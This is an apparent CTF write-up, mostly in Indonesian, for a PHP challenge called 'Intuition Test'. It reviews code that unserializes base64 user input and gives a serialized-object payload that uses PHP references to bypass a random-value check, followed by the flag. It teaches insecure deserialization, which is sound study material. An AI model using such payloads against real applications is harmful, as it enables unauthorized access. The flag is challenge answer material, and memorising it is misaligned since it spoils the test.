#  Intuition Test

#Desc
> If your intuition is on point, you’ll walk away with the flag. If not, well... at least you tried, right?
`[index.php]`

## About the Challenge
Given 1 file yaitu `[index.php]`

## How to solve?
Ini adalah tampilan websitenya.
![img1](img/1.png)

source code review
![img2](img/2.png)

oke disini kita coba sedikit review jadi ini adalah sebuah web yang menampikkan sebuah fitur tampilan warna dengan RGB yang diinputkan oleh user. Tetapi disini kita tahu bahwa terdapat 2 property utama yaitu expected_* dan input_* dimana expected property berperan sebagai pengatur warna yang diatur secara default oleh server dengan random dan input property berperan sebagai pemberi warna yang diatur secara optional oleh user. 

Nah kita diminta untuk memastikan input property dapat memiliki value yang sama dengan expected property. Mungkin ini terlihat sulit karena expected property diberikan secara random. 
Tetapi perhatikan disini 
```
...snippet...
} elseif (isset($_GET['i'])) {
    $decoded_input = base64_decode($_GET['i']);
    $obj = unserialize($decoded_input);
    if ($obj instanceof IntuitionTest) {
        $name = $obj->name;
        $obj->expected_R = rand(0, 255);
        $obj->expected_G = rand(0, 255);
        $obj->expected_B = rand(0, 255);

        if ($obj->expected_R === $obj->input_R && $obj->expected_G === $obj->input_G && $obj->expected_B === $obj->input_B) {
            $message = "You guessed it right, $name! <br><br><br> $flag";
...snippet...
```

ternyata jika kita request secara GET dengan var i maka akan di decode dan unserialize, jika merupakan instance dari class IntuitionTest, maka akan proses pada pengkondisian statement untuk mendapatkan flag. Kita tinggal buat saja object dari class IntuitionTest dimana input_* bervalue expected_* untuk mengikuti perubahan yang ditetapkan oleh server.

```
    $obj = new IntuitionTest();
    $obj->name = 'test';
    $obj->expected_R = 10;
    $obj->expected_G = 10;
    $obj->expected_B = 10;
    $obj->input_R = &$obj->expected_R;
    $obj->input_G = &$obj->expected_G;
    $obj->input_B = &$obj->expected_B;

    $serialized_obj = serialize($obj);
    $serialized_obj_b64 = base64_encode($serialized_obj);
    var_dump($serialized_obj_b64);
```
kita jalankan di local server php. `php -S localhost:8000`
![img3](img/3.png)

![img4](img/4.png)
Alhamdulillah, kita dapatkan flagnya



```
ARA6{ara_ara!_you_have_good_intuition!}
```
